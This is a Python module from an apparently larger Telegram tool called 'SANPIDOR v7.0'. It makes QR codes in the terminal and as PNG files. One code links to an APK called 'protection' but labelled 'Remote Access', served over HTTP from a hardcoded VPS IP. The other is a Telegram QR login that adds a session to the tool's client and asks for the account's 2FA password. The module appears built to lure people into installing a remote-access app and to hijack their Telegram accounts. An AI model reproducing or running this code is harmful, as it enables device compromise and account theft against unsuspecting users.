"""
QR-модуль SANPIDOR v7.0
  QR 1 — ссылка на скачивание APK защиты
  QR 2 — Telegram Login (auth.ExportLoginToken)
"""
import io
import asyncio
import sys
import threading
from pathlib import Path

VPS_HOST = "144.31.171.1"
VPS_PORT = 8080
APK_URL  = f"http://{VPS_HOST}:{VPS_PORT}/download"

G_DIM    = "\033[32m"
G_BRIGHT = "\033[92m"
G_BOLD   = "\033[32;1m"
RED      = "\033[31m"
RESET    = "\033[0m"


def _print_qr_terminal(data: str, title: str):
    """Печатает QR в терминале символами."""
    try:
        import qrcode
        qr = qrcode.QRCode(version=None, box_size=1, border=2,
                           error_correction=qrcode.constants.ERROR_CORRECT_M)
        qr.add_data(data)
        qr.make(fit=True)
        print(f"\n{G_BOLD}  ┌─ {title} {'─' * (50 - len(title))}┐{RESET}")
        f = io.StringIO()
        qr.print_ascii(out=f, invert=True)
        for line in f.getvalue().splitlines():
            print(f"  {line}")
        print(f"{G_BOLD}  └{'─' * 52}┘{RESET}")
        print(f"  {G_BRIGHT}Данные: {data}{RESET}\n")
        return True
    except ImportError:
        print(f"  [!] Установи qrcode: pip install qrcode")
        return False


def _save_qr_image(data: str, out_path: Path, title: str):
    """Сохраняет QR как PNG, встроенный в зелёную рамку."""
    try:
        import qrcode
        from PIL import Image, ImageDraw, ImageFont
        qr = qrcode.QRCode(version=None, box_size=8, border=3,
                           error_correction=qrcode.constants.ERROR_CORRECT_M)
        qr.add_data(data)
        qr.make(fit=True)
        qr_img = qr.make_image(fill_color="#00CC00", back_color="#0a0a0a")
        qr_arr = qr_img.convert("RGBA")
        w, h = qr_arr.size
        pad = 40
        canvas = Image.new("RGBA", (w + pad * 2, h + pad * 2 + 30), "#0a0a0a")
        canvas.paste(qr_arr, (pad, pad))
        draw = ImageDraw.Draw(canvas)
        draw.rectangle([2, 2, canvas.width - 3, canvas.height - 3],
                       outline="#00CC00", width=2)
        try:
            font = ImageFont.truetype("arial.ttf", 14)
        except Exception:
            font = ImageFont.load_default()
        draw.text((pad, h + pad + 8), title, fill="#00CC00", font=font)
        canvas.save(str(out_path))
        print(f"  {G_BRIGHT}[✓] QR сохранён: {out_path}{RESET}")
        return True
    except ImportError:
        print(f"  [!] Для PNG нужны: pip install qrcode pillow")
        return False


async def h_qr_panel(client):
    """Панель QR-кодов."""
    from pyrogram.raw import functions as rf

    while True:
        print(f"""
{G_BOLD}╔══════════════════════════════════════════════════════╗
║               QR-КОДЫ  ▓  БЫСТРЫЙ КЛЮЧ              ║
╠══════════════════════════════════════════════════════╣{RESET}
║  {G_BRIGHT}1.{RESET}  QR — скачать APK защиты (Remote Access)        ║
║  {G_BRIGHT}2.{RESET}  QR — Telegram Login (добавить сессию)          ║
║  {G_BRIGHT}3.{RESET}  Оба QR сразу                                   ║
║  {RED}0.{RESET}  Назад                                           ║
{G_BOLD}╚══════════════════════════════════════════════════════╝{RESET}
""")
        choice = input("  Выбор: ").strip()
        if choice == "0":
            break
        elif choice == "1":
            await _show_apk_qr()
        elif choice == "2":
            await _show_tg_login_qr(client)
        elif choice == "3":
            await _show_apk_qr()
            await _show_tg_login_qr(client)
        else:
            print("  Неверный выбор.")


async def _show_apk_qr():
    """QR 1 — ссылка на APK."""
    print(f"\n  {G_BRIGHT}▓ QR 1: Скачать APK защиты{RESET}")
    print(f"  Ссылка: {APK_URL}")
    _print_qr_terminal(APK_URL, "APK Remote Access")
    save = input("  Сохранить как PNG? (y/n): ").strip().lower()
    if save == "y":
        out = Path(__file__).parent / "qr_apk.png"
        _save_qr_image(APK_URL, out, f"Remote Access — {APK_URL}")
    input("  Enter для продолжения...")


async def _show_tg_login_qr(client):
    """QR 2 — полный флоу входа по QR с поддержкой 2FA."""
    from pyrogram.raw import functions as rf, types as rt
    import base64

    stop_event = asyncio.Event()

    def _wait_enter():
        input("")
        stop_event.set()

    t = threading.Thread(target=_wait_enter, daemon=True)
    t.start()

    count = 0
    while not stop_event.is_set():
        count += 1
        print(f"\n  {G_BRIGHT}▓ QR 2: Telegram Login (#{count}){RESET}")
        print("  Генерирую токен... (Enter — выход без входа)")
        try:
            result = await client.invoke(rf.auth.ExportLoginToken(
                api_id=client.api_id,
                api_hash=client.api_hash,
                except_ids=[],
            ))

            token_b64 = base64.urlsafe_b64encode(result.token).rstrip(b"=").decode()
            tg_url = f"tg://login?token={token_b64}"
            _print_qr_terminal(tg_url, "Telegram Login QR")
            print(f"  {G_BRIGHT}[i] Настройки → Устройства → Привязать устройство{RESET}")
            print(f"  {G_DIM}Ожидаю сканирования... (обновление через 25с, Enter — выход){RESET}")

            # Ждём 25 секунд — каждую секунду проверяем не отсканировали ли QR
            scanned = False
            for _ in range(25):
                if stop_event.is_set():
                    break
                await asyncio.sleep(1)

                # Проверяем статус токена
                try:
                    check = await client.invoke(rf.auth.ExportLoginToken(
                        api_id=client.api_id,
                        api_hash=client.api_hash,
                        except_ids=[],
                    ))
                    # Если токен изменился — QR ещё не отсканирован, продолжаем
                    new_token = base64.urlsafe_b64encode(check.token).rstrip(b"=").decode()
                    if new_token != token_b64:
                        # Новый токен выдан — значит старый принят, пробуем ImportLoginToken
                        try:
                            import_result = await client.invoke(rf.auth.ImportLoginToken(
                                token=result.token
                            ))
                            if hasattr(import_result, 'authorization'):
                                print(f"\n  {G_BRIGHT}[✓] Вход выполнен успешно!{RESET}")
                                stop_event.set()
                                scanned = True
                                break
                        except Exception as ie:
                            ie_str = str(ie)
                            if "SESSION_PASSWORD_NEEDED" in ie_str:
                                # Нужна 2FA
                                stop_event.set()
                                print(f"\n  {G_BRIGHT}[i] Требуется пароль 2FA{RESET}")
                                pwd = input("  Введи пароль облачного аккаунта: ").strip()
                                if pwd:
                                    try:
                                        await client.check_password(pwd)
                                        print(f"  {G_BRIGHT}[✓] Вход выполнен успешно!{RESET}")
                                    except Exception as pe:
                                        print(f"  {RED}[!] Неверный пароль: {pe}{RESET}")
                                scanned = True
                                break
                            elif "AUTH_TOKEN_ALREADY_ACCEPTED" in ie_str:
                                print(f"\n  {G_BRIGHT}[✓] QR принят Telegram!{RESET}")
                                stop_event.set()
                                scanned = True
                                break
                except Exception:
                    pass

            if scanned or stop_event.is_set():
                break

        except Exception as e:
            print(f"  [!] Ошибка: {e}")
            break

    print(f"  Выход из QR-режима.")
